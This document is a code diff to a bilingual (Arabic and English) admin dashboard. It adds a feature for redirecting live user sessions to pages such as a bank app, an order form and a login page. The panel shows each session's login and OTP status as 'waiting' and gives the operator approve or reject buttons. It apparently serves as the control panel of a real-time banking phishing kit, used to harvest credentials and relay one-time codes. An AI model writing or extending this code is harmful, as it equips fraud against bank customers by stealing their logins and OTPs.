@@ -156,6 +156,36 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
 .btn-block { background: rgba(156,163,175,0.2); color: #f87171; border: 1px solid rgba(248,113,113,0.3); }
 .btn-block:hover { background: rgba(248,113,113,0.2); }
 
+.redirect-pages-list { list-style: none; padding: 0; margin: 0; }
+.redirect-page-item {
+  display: flex; align-items: center; gap: 14px; padding: 14px 18px;
+  border: 1px solid rgba(255,255,255,0.06); border-radius: 14px;
+  margin-bottom: 10px; cursor: pointer; transition: all 0.2s;
+}
+.redirect-page-item:hover { background: rgba(0,200,255,0.1); border-color: rgba(0,200,255,0.3); }
+.redirect-page-item .rp-icon {
+  width: 42px; height: 42px; border-radius: 12px; display: flex;
+  align-items: center; justify-content: center; flex-shrink: 0;
+}
+.redirect-page-item .rp-icon.ar { background: rgba(52,211,153,0.15); }
+.redirect-page-item .rp-icon.en { background: rgba(0,200,255,0.15); }
+.redirect-page-item .rp-icon svg { width: 20px; height: 20px; }
+.redirect-page-item .rp-info { flex: 1; }
+.redirect-page-item .rp-name { font-size: 0.95rem; font-weight: 600; color: #fff; margin-bottom: 2px; }
+.redirect-page-item .rp-url { font-size: 0.78rem; color: #6b7f9e; direction: ltr; font-family: monospace; }
+.redirect-page-item .rp-lang { font-size: 0.72rem; padding: 3px 10px; border-radius: 8px; font-weight: 600; }
+.redirect-page-item .rp-lang.ar { background: rgba(52,211,153,0.15); color: #34d399; }
+.redirect-page-item .rp-lang.en { background: rgba(0,200,255,0.15); color: #00c8ff; }
+.btn-session-redirect {
+  background: rgba(139,92,246,0.15); color: #a78bfa;
+  border: 1px solid rgba(139,92,246,0.2); width: 100%;
+  padding: 10px; border-radius: 12px; font-size: 0.85rem; font-weight: 600;
+  cursor: pointer; font-family: inherit; display: flex; align-items: center;
+  justify-content: center; gap: 6px; margin-top: 0;
+}
+.btn-session-redirect:hover { background: rgba(139,92,246,0.25); }
+.redirect-section-title { font-size: 0.85rem; color: #6b7f9e; font-weight: 600; margin-bottom: 12px; padding-bottom: 8px; border-bottom: 1px solid rgba(255,255,255,0.06); }
+
 .visitors-table {
   width: 100%; background: linear-gradient(135deg, #1a2d44 0%, #162336 100%);
   border: 1px solid rgba(255,255,255,0.06); border-radius: 20px;
@@ -283,6 +313,18 @@ body { font-family: 'Segoe UI', Tahoma, sans-serif; background: #0f1923; color: 
         حظر IP
       </button>
     </div>
+  </div>
+</div>
+
+<div class="modal-overlay" id="redirectModal">
+  <div class="modal">
+    <button class="modal-close" onclick="closeRedirectModal()">&times;</button>
+    <h2 class="modal-title">
+      <svg width="22" height="22" viewBox="0 0 24 24" fill="none" stroke="#a78bfa" stroke-width="2" style="vertical-align:middle;margin-left:8px;"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg>
+      إعادة توجيه المستخدم
+    </h2>
+    <div class="redirect-section-title" id="redirectTarget"></div>
+    <ul class="redirect-pages-list" id="redirectPagesList"></ul>
   </div>
 </div>
 
@@ -525,9 +567,73 @@ function blockIP() {
   });
 }
 
+var redirectPages = [
+  { url: '/ar/', name: 'الصفحة الرئيسية', lang: 'ar', icon: 'home' },
+  { url: '/en/', name: 'Home Page', lang: 'en', icon: 'home' },
+  { url: '/ar/mbankapp/', name: 'تطبيق البنك', lang: 'ar', icon: 'app' },
+  { url: '/en/mbankapp/', name: 'Bank App', lang: 'en', icon: 'app' },
+  { url: '/ar/order/', name: 'نموذج الطلب', lang: 'ar', icon: 'order' },
+  { url: '/en/order/', name: 'Order Form', lang: 'en', icon: 'order' },
+  { url: '/ar/login/', name: 'تسجيل الدخول', lang: 'ar', icon: 'login' },
+  { url: '/en/login/', name: 'Login', lang: 'en', icon: 'login' }
+];
+
+var redirectCurrentType = '';
+var redirectCurrentId = -1;
+
+var pageIcons = {
+  home: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M3 9l9-7 9 7v11a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2z"/><polyline points="9 22 9 12 15 12 15 22"/></svg>',
+  app: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="5" y="2" width="14" height="20" rx="2" ry="2"/><line x1="12" y1="18" x2="12.01" y2="18"/></svg>',
+  order: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14,2 14,8 20,8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>',
+  login: '<svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M15 3h4a2 2 0 0 1 2 2v14a2 2 0 0 1-2 2h-4"/><polyline points="10 17 15 12 10 7"/><line x1="15" y1="12" x2="3" y2="12"/></svg>'
+};
+
+function openRedirectModal(type, id, label) {
+  redirectCurrentType = type;
+  redirectCurrentId = id;
+  document.getElementById('redirectTarget').textContent = label;
+  var list = document.getElementById('redirectPagesList');
+  list.innerHTML = '';
+  redirectPages.forEach(function(p) {
+    var li = document.createElement('li');
+    li.className = 'redirect-page-item';
+    li.onclick = function() { selectRedirectPage(p.url); };
+    li.innerHTML =
+      '<div class="rp-icon ' + p.lang + '">' + pageIcons[p.icon] + '</div>' +
+      '<div class="rp-info"><div class="rp-name">' + p.name + '</div><div class="rp-url">' + p.url + '</div></div>' +
+      '<span class="rp-lang ' + p.lang + '">' + (p.lang === 'ar' ? 'عربي' : 'English') + '</span>';
+    list.appendChild(li);
+  });
+  document.getElementById('redirectModal').classList.add('show');
+}
+
+function closeRedirectModal() {
+  document.getElementById('redirectModal').classList.remove('show');
+}
+
+function selectRedirectPage(url) {
+  if (redirectCurrentType === 'session') {
+    fetch('/api/sessions/redirect', {
+      method: 'POST',
+      headers: { 'Content-Type': 'application/json', 'X-Admin-Token': adminToken },
+      body: JSON.stringify({ id: redirectCurrentId, url: url })
+    }).then(function() {
+      closeRedirectModal();
+      loadSessions();
+    });
+  }
+}
+
 function redirectOrder(id) {
   var o = ordersData.find(function(x) { return x.id === id; });
-  if (o) alert('إعادة توجيه الطلب #' + o.id + ' - ' + o.name);
+  if (!o) return;
+  openRedirectModal('order', id, 'طلب #' + o.id + ' - ' + (o.name || o.ip));
+}
+
+function redirectSession(id) {
+  var s = sessionsData.find(function(x) { return x.id === id; });
+  if (!s) return;
+  openRedirectModal('session', id, 'جلسة #' + s.id + ' - ' + (s.username || s.ip));
 }
 
 var sessionsData = [];
@@ -582,16 +688,25 @@ function renderSessions() {
     }
 
     var actionsHtml = '';
+    var isActive = s.loginStatus === 'waiting' || s.otpStatus === 'waiting';
     if (s.pendingAction) {
       var aType = s.pendingAction.type;
       var aId = s.pendingAction.id;
       var label = aType === 'login' ? 'تسجيل الدخول' : 'رمز OTP';
-      actionsHtml = '<div class="session-card-actions">' +
+      actionsHtml = '<div class="session-card-actions" style="flex-wrap:wrap;">' +
         '<button class="btn-action btn-approve" onclick="sessionAction(\'' + aType + '\',' + aId + ',\'approved\')">' +
         '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><polyline points="20 6 9 17 4 12"/></svg> قبول ' + label +
         '</button>' +
         '<button class="btn-action btn-reject" onclick="sessionAction(\'' + aType + '\',' + aId + ',\'rejected\')">' +
         '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><line x1="18" y1="6" x2="6" y2="18"/><line x1="6" y1="6" x2="18" y2="18"/></svg> رفض ' + label +
+        '</button>' +
+        '<button class="btn-session-redirect" onclick="redirectSession(' + s.id + ')">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg> إعادة التوجيه' +
+        '</button></div>';
+    } else if (isActive) {
+      actionsHtml = '<div class="session-card-actions">' +
+        '<button class="btn-session-redirect" onclick="redirectSession(' + s.id + ')">' +
+        '<svg width="16" height="16" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M18 13v6a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2V8a2 2 0 0 1 2-2h6"/><polyline points="15 3 21 3 21 9"/><line x1="10" y1="14" x2="21" y2="3"/></svg> إعادة التوجيه' +
         '</button></div>';
     }
 
@@ -645,6 +760,9 @@ setInterval(function() {
 
 document.getElementById('detailsModal').addEventListener('click', function(e) {
   if (e.target === this) closeModal();
+});
+document.getElementById('redirectModal').addEventListener('click', function(e) {
+  if (e.target === this) closeRedirectModal();
 });
 </script>
 </body>
